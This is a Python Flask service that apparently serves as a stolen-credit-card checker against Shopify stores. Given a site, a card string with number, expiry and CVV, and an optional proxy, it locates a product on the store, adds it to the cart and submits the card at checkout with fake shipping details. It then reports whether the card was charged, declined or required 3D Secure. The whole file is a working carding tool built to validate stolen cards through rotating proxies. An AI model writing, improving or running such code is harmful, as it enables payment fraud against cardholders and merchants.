from flask import Flask, request, jsonify
import requests
import re
import logging
import os
from datetime import datetime

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    match = re.search(pattern, text)
    if match:
        card, month, year, cvv = match.groups()
        if len(year) == 2:
            year = '20' + year
        return card, month, year, cvv
    return None, None, None, None

def get_product_and_variant(site, session, proxy_dict):
    """Fetch a product and its first available variant using multiple methods."""
    # Method 1: products.json
    try:
        url = f"{site}/products.json?limit=1"
        resp = session.get(url, proxies=proxy_dict, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('products'):
                product = data['products'][0]
                product_id = product['id']
                variants = product.get('variants', [])
                if variants:
                    for v in variants:
                        if v.get('available', True):
                            return product_id, v['id']
                    return product_id, variants[0]['id']
    except:
        pass

    # Method 2: collections/all/products.json
    try:
        url = f"{site}/collections/all/products.json?limit=1"
        resp = session.get(url, proxies=proxy_dict, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('products'):
                product = data['products'][0]
                product_id = product['id']
                variants = product.get('variants', [])
                if variants:
                    for v in variants:
                        if v.get('available', True):
                            return product_id, v['id']
                    return product_id, variants[0]['id']
    except:
        pass

    # Method 3: try common product IDs (1 to 20)
    for pid in range(1, 21):
        try:
            url = f"{site}/products/{pid}.json"
            resp = session.get(url, proxies=proxy_dict, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('product'):
                    product = data['product']
                    product_id = product['id']
                    variants = product.get('variants', [])
                    if variants:
                        for v in variants:
                            if v.get('available', True):
                                return product_id, v['id']
                        return product_id, variants[0]['id']
        except:
            pass

    # Method 4: try to get product from cart (if items exist)
    try:
        url = f"{site}/cart.js"
        resp = session.get(url, proxies=proxy_dict, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('items'):
                item = data['items'][0]
                return item.get('product_id'), item.get('variant_id')
    except:
        pass

    return None, None

def add_to_cart(site, session, variant_id, proxy_dict):
    try:
        url = f"{site}/cart/add.js"
        payload = {'id': variant_id, 'quantity': 1}
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        resp = session.post(url, data=payload, headers=headers, proxies=proxy_dict, timeout=20)
        return resp.status_code == 200
    except:
        return False

def process_payment(site, session, card, month, year, cvv, proxy_dict):
    checkout_url = f"{site}/checkout"
    try:
        resp = session.get(checkout_url, proxies=proxy_dict, timeout=20)
        if resp.status_code != 200:
            return {"status": "error", "message": f"Checkout page failed (HTTP {resp.status_code})", "price": 0}
        html = resp.text
        token_match = re.search(r'name="authenticity_token" value="([^"]+)"', html)
        token = token_match.group(1) if token_match else None
    except Exception as e:
        return {"status": "error", "message": f"Failed to load checkout: {str(e)}", "price": 0}

    payload = {
        'authenticity_token': token or '',
        'checkout[credit_card][number]': card,
        'checkout[credit_card][month]': month,
        'checkout[credit_card][year]': year,
        'checkout[credit_card][verification_value]': cvv,
        'checkout[payment_gateway]': 'shopify_payments',
        'checkout[accepts_terms]': '1',
        'checkout[shipping_address][first_name]': 'John',
        'checkout[shipping_address][last_name]': 'Doe',
        'checkout[shipping_address][address1]': '123 Main St',
        'checkout[shipping_address][city]': 'New York',
        'checkout[shipping_address][province]': 'NY',
        'checkout[shipping_address][zip]': '10001',
        'checkout[shipping_address][country]': 'US',
        'checkout[shipping_address][phone]': '1234567890',
        'checkout[email]': 'test@example.com',
    }

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Referer': f"{site}/checkout"
    }

    try:
        payment_url = f"{site}/checkout/payment"
        if token:
            payment_url = f"{site}/checkout/{token}/payment"

        resp = session.post(payment_url, data=payload, headers=headers, proxies=proxy_dict, timeout=30)

        if resp.status_code == 200:
            html = resp.text.lower()
            if 'order placed' in html or 'thank you' in html:
                price_match = re.search(r'total_price["\']?\s*[:=]\s*["\']?([\d.]+)', resp.text)
                price = float(price_match.group(1)) if price_match else 0.0
                return {"status": "charged", "message": "Order placed successfully", "price": price}
            elif '3ds' in html or '3d secure' in html:
                return {"status": "3ds", "message": "3DS_REQUIRED", "price": 0}
            else:
                error_match = re.search(r'<p class="error">(.*?)</p>', resp.text, re.DOTALL)
                if error_match:
                    return {"status": "declined", "message": error_match.group(1).strip(), "price": 0}
                return {"status": "declined", "message": "CARD_DECLINED", "price": 0}
        else:
            return {"status": "error", "message": f"Payment HTTP {resp.status_code}", "price": 0}
    except Exception as e:
        return {"status": "error", "message": str(e), "price": 0}

def checkout_shopify(site, card, month, year, cvv, proxy=None):
    session = requests.Session()
    proxy_dict = None
    if proxy:
        parts = proxy.split(':')
        if len(parts) == 4:
            ip, port, user, password = parts
            proxy_dict = {'http': f'http://{user}:{password}@{ip}:{port}', 'https': f'https://{user}:{password}@{ip}:{port}'}
        elif len(parts) == 2:
            ip, port = parts
            proxy_dict = {'http': f'http://{ip}:{port}', 'https': f'https://{ip}:{port}'}

    product_id, variant_id = get_product_and_variant(site, session, proxy_dict)
    if not product_id or not variant_id:
        return {"Response": "No product or variant found on this store", "Price": 0, "Gateway": "Shopify Payments"}

    if not add_to_cart(site, session, variant_id, proxy_dict):
        return {"Response": "Failed to add product to cart", "Price": 0, "Gateway": "Shopify Payments"}

    result = process_payment(site, session, card, month, year, cvv, proxy_dict)

    if result['status'] == 'charged':
        return {"Response": result['message'], "Price": result['price'], "Gateway": "Shopify Payments"}
    elif result['status'] == '3ds':
        return {"Response": "3DS_REQUIRED", "Price": 0, "Gateway": "Shopify Payments"}
    elif result['status'] == 'declined':
        return {"Response": result['message'], "Price": 0, "Gateway": "Shopify Payments"}
    else:
        return {"Response": f"ERROR: {result['message']}", "Price": 0, "Gateway": "Shopify Payments"}

@app.route('/shopify', methods=['GET'])
def shopify_check():
    site = request.args.get('site')
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')

    if not site or not cc:
        return jsonify({"Response": "Missing site or cc", "Price": 0, "Gateway": "Shopify Payments"}), 400

    card, month, year, cvv = extract_cc(cc)
    if not card:
        return jsonify({"Response": "Invalid card format", "Price": 0, "Gateway": "Shopify Payments"}), 400

    if not site.startswith('http'):
        site = 'https://' + site

    try:
        result = checkout_shopify(site, card, month, year, cvv, proxy)
        return jsonify(result)
    except Exception as e:
        app.logger.error(f"Unhandled exception: {e}")
        return jsonify({"Response": f"ERROR: {str(e)}", "Price": 0, "Gateway": "Shopify Payments"}), 500

@app.route('/ping')
def ping():
    return jsonify({"status": "alive", "time": datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
